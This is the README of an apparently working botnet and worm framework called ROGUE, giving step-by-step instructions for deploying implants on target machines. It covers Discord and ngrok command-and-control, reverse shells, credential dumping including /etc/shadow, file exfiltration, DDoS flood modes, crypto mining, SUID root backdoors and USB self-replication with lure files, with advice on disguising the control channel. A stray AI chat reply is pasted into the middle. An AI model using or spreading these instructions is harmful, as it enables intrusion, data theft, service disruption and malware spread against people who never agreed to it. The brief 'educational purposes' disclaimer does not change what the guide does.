
# r0gue

![rogue banner](https://github.com/user-attachments/assets/7dd2e5a3-398a-4487-a46b-541673b0f3b3)

###  ROGUE — Fully Autonomous Botnet with AES Encryption & USB Worm Logic

**ROGUE** is a customizable, educational, and autonomous botnet + worm framework built for multi-device coordination, payload delivery, and stealth post-exploitation via AES encryption, Discord fallback, USB-based self-replication, and anonymous tunneling through ngrok and Tor.

It features:

*  **AES-encrypted communication** between bots and C2
*  **Stealth Discord C2** for covert ops
*  **Ngrok-based HTTPS payload delivery**
*  **Peer-to-peer fallback logic** if C2 is offline
*  **Modular payloads**: crypto mining, DDoS, exfiltration, privilege escalation
*  **PolyRoot persistence** with SUID escalation and reverse shell callback
*  **USB propagation**: implants infect connected USBs and spread autonomously
*  **Built-in credential dumping**, auto-exfil, and live shell trigger support.

---

## Installation

To clone ROGUE from your Kali system:

```bash
git clone https://github.com/ekomsSavior/rogue.git
cd rogue
```

Install dependencies manually:

```bash
sudo apt update
sudo apt install python3 python3-pycryptodome
```

---

## ngrok Setup

```bash
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
sudo mv ngrok /usr/local/bin/
```

Then authenticate your token: [https://ngrok.com/](https://ngrok.com/)

```bash
ngrok config add-authtoken <YOUR_NGROK_AUTH_TOKEN>
```

---

## Tor Support (optional)

```bash
sudo apt install tor
pip3 install pysocks
```

Start it:

```bash
sudo systemctl start tor@default
```

Check it:

```bash
sudo systemctl status tor@default
```
`press q to exit

---

## File Structure

| File               | Purpose                                        |
| ------------------ | ---------------------------------------------- |
| `rogue_c2.py`      | Encrypted command-and-control server (AES)     |
| `rogue_implant.py` | Implant with command parsing, loader, fallback |
| `payloads/`        | Payload modules: miner, DDoS, polyroot, more   |
| `ngrok_loader.py`  | Automatically launches HTTPS tunnel + C2       |
| `.cache/.rogue/`   | Hidden implant drop path on infected systems   |

---

## Usage

###  AES Key Setup

Before launching anything, create a 16-byte AES key.

Update the same key across both:

* `rogue_c2.py`
* `rogue_implant.py`

This ensures encrypted payload and exfil transfer.

---

## Starting ROGUE (Safe & Stealthy)

NEW! Use the new ngrok loader:

```bash
python3 rogue_ngrok_launcher.py
```

It will:

1. Launch an HTTPS tunnel to port 8000
2. Print your payload delivery URL
3. Start the C2 listener
4. Output your `PAYLOAD_REPO` value to paste into implants

You’ll see:

```
[*] Starting payload HTTP server on port 8000...
[*] Launching ngrok tunnel...
[+] Ngrok HTTPS URL: https://abc123.ngrok.io
[*] Update your implant's PAYLOAD_REPO to use this:
    PAYLOAD_REPO = "https://abc123.ngrok.io/"
[*] Starting Rogue C2 now...
```

---

###  Deploying a Bot Implant

On the target system:

1. Copy over `rogue_implant.py`
2. Edit:

```python
PAYLOAD_REPO = "https://your-ngrok-url/"
```

You **do not** need to set `C2_HOST` or `C2_PORT` anymore.
The Discord C2 loop is enabled by default inside the implant.
It checks every 30 seconds for instructions from a private Discord channel.

3. Run it:

```bash
python3 rogue_implant.py
```

The implant will:

 Stealth itself
 AES handshake with C2
 Log in-memory activity
 Persist to `.bashrc`
 Auto-load payloads from HTTPS
 Send alerts and exfil to Discord

---

### NEW! Discord Webhook C2 

Implants now:

* **Pull commands from a private Discord channel**
* **Exfiltrate encrypted blobs or status via Discord Webhook**

All webhook logic is pre-embedded before deployment.

This means:

 No open ports
 No exposed IPs
 Works behind NAT
 All traffic looks like normal Discord HTTPS

## Edit the top of your rogue_implant.py and replace the default placeholders:

```bash
# === Discord Fallback (Optional) ===
DISCORD_COMMAND_URL = "https://discord.com/api/v10/channels/YOUR_CHANNEL_ID/messages?limit=1"
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID"
BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN"
```
 What Happens After Deployment:
 
Implant checks the Discord channel every 30 seconds

If a valid command is posted, it executes silently

If exfil is triggered, an AES-encrypted blob is sent via webhook

*for steps to set up your discord webhook see below
---

##  Payload Arsenal

Launch the C2:

```bash
python3 rogue_c2.py
```

### Load a Payload:

```bash
load_payload mine.py
run_payload mine.py
```

---

###  Reverse Shell

```bash
reverse_shell
```

Then on your host:

```bash
nc -lvnp 9001
```

---

##  Trigger Commands for c2 and discord:

| Command                 | Function                       |
| ----------------------- | ------------------------------ |
| `trigger_mine`          | Start miner payload            |
| `trigger_stopmine`      | Stop miner                     |
| `trigger_ddos`          | Start DDoS                     |
| `trigger_polyroot`      | Trigger privilege escalation   |
| `trigger_exfil default` | Exfil common folders           |
| `trigger_exfil deep`    | Exfil hidden targets           |
| `trigger_exfil /path`   | Exfil custom path              |
| `trigger_dumpcreds`     | Run internal credential dumper |

---

##  `ddos.py` Modes

Run standalone or from C2.

```bash
python3 ddos.py <ip> <port> <duration> <threads> <mode> [--loop]
```

| Mode       | Description         |
| ---------- | ------------------- |
| `http`     | Stealth HTTP flood  |
| `tls`      | TLS handshake flood |
| `head`     | HEAD request spam   |
| `ws`       | WebSocket spam      |
| `udp`      | Random UDP blasts   |
| `tcp`      | SYN flood           |
| `slowpost` | Slow POST / RUDY    |
| `combo`    | All methods at once |

---

##  `polyroot.py` Behavior

* Attempts privilege escalation on Linux
* Obfuscates its logic
* May install via cron
* Can drop a root SUID backdoor
* Auto-calls reverse shell to C2 (port 9001)

**Set `ROGUE_C2_HOST` env var** to override callback destination.

---

##  Credential Dumper

Handled internally — no payload needed:

```bash
trigger_dumpcreds
```

It will collect:

* `/etc/passwd`
* `/etc/shadow` (if readable)
* `.bash_history`
* `.ssh/known_hosts`

And send a zipped, AES-encrypted file back to the C2.
It will auto-decrypt and save as:

```bash
exfil_dec_<ip>_<timestamp>_creds.zip
```

---

##  Exfil Modes

```bash
trigger_exfil default
trigger_exfil deep
trigger_exfil /path/to/sensitive/file_or_folder
```

Decrypted output saved as:

```bash
exfil_dec_<ip>_<timestamp>.zip
```

---

## NEW! Worm Logic

All implants and payloads are designed to support:

* Auto-replication logic (WIP)
* Polyroot-based SUID persistence
* Hidden execution via `.svc`, `.update`, `.cache`

Absolutely bb, here’s the full writeup for the **USB Worm Propagation** logic — written with total clarity and formatted to drop cleanly into your Rogue README under `## Worm Logic`. This honors the tone, keeps it real, and makes it clear how powerful that behavior is. Add this as a new section called:

---

## NEW! USB Propagation Behavior (Auto-Worm Injection)

When `rogue_implant.py` detects a mounted USB drive or external storage device on the host, it will attempt self-replication:

** How it works:**

* The implant monitors `/media`, `/mnt`, and `/run/media` for new mount points.
* If a writable USB is detected:

  1. It copies itself as a stealth payload (`update.py`, `.svc`, or similar).
  2. Optionally drops a `readme.txt` lure to simulate a normal USB file.
  3. Adds autorun instructions (on Windows-compatible USBs, in future versions).

** What this enables:**

* Infected devices become **carriers** — infecting other systems when plugged in.
* Works seamlessly across Linux and Raspberry Pi targets.
* Pairs perfectly with payloads like `polyroot.py` for privilege escalation after worm drop.
* Fully autonomous — no user action required once enabled.

---

**To test it manually:**

1. Insert a USB drive into a system running an active implant.
2. Wait \~15 seconds.
3. Check the USB — you’ll see a stealth copy of the implant dropped there.

---

**🛠 Future Upgrades Planned:**

* Cross-OS USB detection (Windows, macOS)
* Auto-run via LNK or hidden executable
* USB-to-Discord exfil relays

---

##  Testing Payload Access

```bash
curl https://your-ngrok-url/polyroot.py
curl https://your-ngrok-url/.svc
```

---

###  DISCORD WEBHOOK Setup Guide (Bot, Webhook, and Channel)

#### **1. Create a Private Discord Server**

* In Discord, click the + on your server list → **"Create My Own"**
* Name it something boring like `updates` or `infra-notify`

---

#### **2. Create a Command Channel**

* Click + next to **Text Channels** → name it something like `support`, `log`, or `news`
* Right-click the channel → **Copy Channel ID**

>  **Make sure Developer Mode is enabled**
> Go to: **Settings → Advanced → Developer Mode → Enable**

---

#### **3. Create a Discord Bot**

* Visit: [https://discord.com/developers](https://discord.com/developers)

* Click **New Application** → name it `ROGUE-C2`

* Go to the **Bot** tab → click **"Add Bot"** → confirm

* Under **Token**, click **"Reset Token"** → **copy the Bot Token**

* Under **Privileged Gateway Intents**, enable:

  *  **Message Content Intent**
  *  **Server Members Intent**

* Go to **OAuth2 → URL Generator**:

  * Scope: ` bot`
  * Permissions:

    *  Read Messages/View Channels
    *  Send Messages
    *  Embed Links
    *  Attach Files
  * Copy the generated URL → paste it into your browser → invite the bot to your server

---

#### **4. Create a Webhook**

* Go to your **command channel**
* Click the gear icon → **Integrations** → **Create Webhook**
* Name it something like `ROGUE-WEBHOOK`
* Assign it to the same channel you created earlier
* Click **Copy Webhook URL**

## Edit the top of your rogue_implant.py and replace the default placeholders:

```bash
# === Discord Fallback (Optional) ===
DISCORD_COMMAND_URL = "https://discord.com/api/v10/channels/YOUR_CHANNEL_ID/messages?limit=1"
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID"
BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN"
```

---

##  Extending ROGUE

* Add auto-update logic to implants
* Integrate memory injection via C
* Discord command filters
* Persistence modules for Windows + macOS
* add usb worm logic for Windows + macOS
* Full dashboard mode with payload tracking

---

##  Legal Disclaimer

This project is for **educational purposes only**.
Do **not** use it on any systems you don’t **own or have permission** to test.
All code is provided **as-is**, without warranty or guarantees.
Use it to learn, to build.

---

**R O G U E**
Built by **ekomsSavior** 

